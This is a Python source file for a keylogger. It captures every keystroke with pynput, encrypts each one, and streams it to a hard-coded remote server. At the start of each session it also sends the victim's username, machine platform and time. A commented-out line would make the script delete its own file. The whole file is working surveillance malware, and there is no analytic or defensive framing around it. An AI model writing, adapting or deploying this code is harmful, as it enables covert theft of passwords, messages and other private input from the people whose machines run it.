""" sends keystrokes to remote host
Listeners require memory allocation
'with' keyword releases memory automatically? """
import sys
import os
import socket
import time
import platform
from getpass import getuser
from datetime import datetime
from pynput.keyboard import Listener
from utilities.general_encrypt import AES_256_encrypt as aesenc

HOST = "benjaminmalik.com"
PORT = 8975 #YK
KEY = 'oS4HVRozu-OhydzhLPwV2GwQ4iseTzQkS-W-_SjNwy0=' #Altais :0
SOCK = socket.socket()

def write_to_file(keystroke):
    """ writes key to file and cases out exceptions """
    global KEY

    keystroke = str(keystroke).encode()

    if keystroke:
        try:
            enc_data = aesenc(keystroke, KEY)
            SOCK.send(enc_data)
        except BrokenPipeError:
            #os.remove(__file__)
            print('I died.')
            sys.exit()
        except ConnectionResetError:
            print("Connection Reset")
            sys.exit()

def try_connection():
    """ Tries connection to server in case of connection refused until success. """
    global SOCK, HOST, PORT

    while True:
        try:
            SOCK.connect((HOST, PORT))
            return True
        except ConnectionRefusedError:
            time.sleep(5)
        except:
            return False

def get_header_info():
    """ Fills initial packet with some client details """
    rightnow = datetime.now().strftime("%Y-%m-%d at %H:%M:%S")
    systeminfo = platform.platform()

    try: # Windows
        name = str(getuser())
    except AttributeError: # Linux
        name = str(os.getlogin())
    except: # idk
        name = "???"

    message = f'\t\tLOG FOR {name}\n\t\tMACHINE: {systeminfo}\n\t\tTIME: {rightnow}:\n'
    return message.encode()

def main():
    """ sends keystrokes with header info (IP address and length) to host server """
    global SOCK

    # Verifies Connection
    if not try_connection():
        sys.exit(1)

    # Send Header Info
    SOCK.send(get_header_info())

    # Key delivery loop
    with Listener(on_press=write_to_file) as listen:
        listen.join()

main()
